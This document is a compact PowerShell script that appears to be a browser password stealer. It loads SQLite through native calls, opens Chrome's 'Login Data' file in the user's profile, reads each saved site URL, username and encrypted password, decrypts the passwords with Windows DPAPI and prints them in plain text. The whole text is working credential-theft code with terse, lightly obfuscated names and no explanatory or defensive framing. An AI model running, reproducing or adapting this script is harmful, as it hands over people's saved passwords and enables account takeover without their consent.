$d=Add-Type -A System.Security
$g='")]public static extern '
$i='[DllImport("winsqlite3",EntryPoint="sqlite3_'
$m='[MarshalAs(UnmanagedType.LP'
Add-Type("using System.Runtime.InteropServices;using p=System.IntPtr;public class W{$($i)open$($g)p O($($m)Str)]string f,out p d);$($i)prepare16_v2$($g)p P(p d,$($m)WStr)]string l,int n,out p s,p t);$($i)step$($g)p S(p s);$($i)column_text16$($g)p C(p s,int i);$($i)column_bytes$($g)int Y(p s,int i);$($i)column_blob$($g)p L(p s,int i);public static string T(p s,int i){return Marshal.PtrToStringUni(C(s,i));}public static byte[] B(p s,int i){var r=new byte[Y(s,i)];Marshal.Copy(L(s,i),r,0,Y(s,i));return r;}}")
$s=[W]::O($env:LOCALAPPDATA+'\Google\Chrome\User Data\Default\Login Data',[ref]$d)
$_=[W]::P($d,"SELECT action_url,username_value,password_value FROM logins",-1,[ref]$s,0)
for(;!([W]::S($s)%100)){[W]::T($s,0)+","+[W]::T($s,1)+","+[System.Text.Encoding]::ASCII.GetString([System.Security.Cryptography.ProtectedData]::Unprotect([W]::B($s,2),$null,1))}